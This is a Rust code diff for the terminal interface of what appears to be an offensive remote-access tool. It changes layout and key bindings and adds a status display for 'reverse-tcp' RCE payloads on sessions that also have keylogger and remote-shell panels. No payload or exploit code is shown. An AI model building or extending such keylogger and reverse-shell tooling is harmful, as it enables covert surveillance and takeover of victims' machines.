@@ -3,6 +3,8 @@ pub mod keylogger;
 pub mod session;
 pub mod shell;
 
+use std::fmt::Display;
+
 use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
 use ratatui::{
     layout::{Constraint, Direction, Layout, Margin, Rect},
@@ -16,6 +18,7 @@ use shell::ShellCmdHistory;
 use crate::{
     app::{AppResult, SessionsMap},
     grpc::{RemoteShellServiceClient, SessionServiceClient},
+    tamanoir_grpc::SessionResponse,
 };
 
 #[derive(Debug, PartialEq)]
@@ -93,8 +96,8 @@ impl Sections {
         };
         let (sessions_block, main_block) = {
             let chunks = Layout::default()
-                .direction(Direction::Horizontal)
-                .constraints([Constraint::Length(18), Constraint::Fill(1)])
+                .direction(Direction::Vertical)
+                .constraints([Constraint::Length(6), Constraint::Fill(1)])
                 .flex(ratatui::layout::Flex::SpaceBetween)
                 .split(main_block);
             (chunks[0], chunks[1])
@@ -157,11 +160,9 @@ impl Sections {
                 match key_event.code {
                     KeyCode::Char('j') | KeyCode::Down => {
                         self.shell_percentage_split = Some(k.saturating_sub(5).max(20));
-                        // decrease by 5%
                     }
                     KeyCode::Char('k') | KeyCode::Up => {
                         Some(self.shell_percentage_split = Some((k + 5).min(90)));
-                        // increase by 5%
                     }
                     _ => {}
                 }
@@ -192,24 +193,41 @@ impl Sections {
                     }
                     _ => {}
                 },
-                KeyCode::Char('s') => {
-                    self.shell_percentage_split = if let Some(_) = self.shell_percentage_split {
-                        None
-                    } else {
-                        Some(20)
-                    };
-                }
+
                 _ => match self.focused_section {
                     FocusedSection::Sessions => match key_event.code {
                         KeyCode::Enter => {}
                         KeyCode::Char('j') | KeyCode::Down => self.session_section.next_row(),
                         KeyCode::Char('k') | KeyCode::Up => self.session_section.previous_row(),
+                        KeyCode::Char('s') => {
+                            self.shell_percentage_split =
+                                if let Some(_) = self.shell_percentage_split {
+                                    None
+                                } else {
+                                    Some(20)
+                                };
+                        }
 
+                        _ => {}
+                    },
+                    FocusedSection::KeyLogger => match key_event.code {
+                        KeyCode::Char('s') => {
+                            self.shell_percentage_split =
+                                if let Some(_) = self.shell_percentage_split {
+                                    None
+                                } else {
+                                    Some(20)
+                                };
+                        }
                         _ => {}
                     },
                     FocusedSection::Shell => {
                         self.shell_section
-                            .handle_keys(key_event, shell_client)
+                            .handle_keys(
+                                key_event,
+                                shell_client,
+                                self.session_section.selected_session.clone(),
+                            )
                             .await?;
                     }
 
@@ -219,5 +237,41 @@ impl Sections {
         }
 
         Ok(())
+    }
+}
+pub enum ShellAvailablilityStatus {
+    NotSelectedForTransmission,
+    Transmiting,
+    Connected,
+}
+
+impl Display for ShellAvailablilityStatus {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        let msg = match self {
+            Self::Connected => "Connected ",
+            Self::Transmiting => "Waiting for tx to complete...",
+            Self::NotSelectedForTransmission => "Unavailable",
+        };
+        write!(f, "{}", msg)
+    }
+}
+
+impl SessionResponse {
+    fn get_shell_status(&self) -> ShellAvailablilityStatus {
+        match &self.rce_payload {
+            Some(rce_payload) => {
+                if rce_payload.name == "reverse-tcp" {
+                    if rce_payload.buffer_length > 0 {
+                        ShellAvailablilityStatus::Transmiting
+                    } else {
+                        ShellAvailablilityStatus::Connected
+                    }
+                } else {
+                    ShellAvailablilityStatus::NotSelectedForTransmission
+                }
+            }
+
+            None => ShellAvailablilityStatus::NotSelectedForTransmission,
+        }
     }
 }
